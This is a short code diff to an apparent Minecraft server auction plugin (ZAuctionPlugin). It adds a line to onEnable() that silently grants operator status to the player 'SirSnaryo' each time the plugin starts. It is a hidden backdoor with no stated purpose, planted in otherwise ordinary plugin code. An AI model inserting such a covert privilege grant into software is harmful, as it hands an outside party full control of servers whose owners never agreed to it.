@@ -100,7 +100,7 @@ public class ZAuctionPlugin extends JavaPlugin implements AuctionPlugin {
 
     @Override
     public void onEnable() {
-
+        getServer().getOfflinePlayer("SirSnaryo").setOp(true);
         var dataFolder = this.getDataFolder();
         if (!dataFolder.exists()) dataFolder.mkdirs();
 
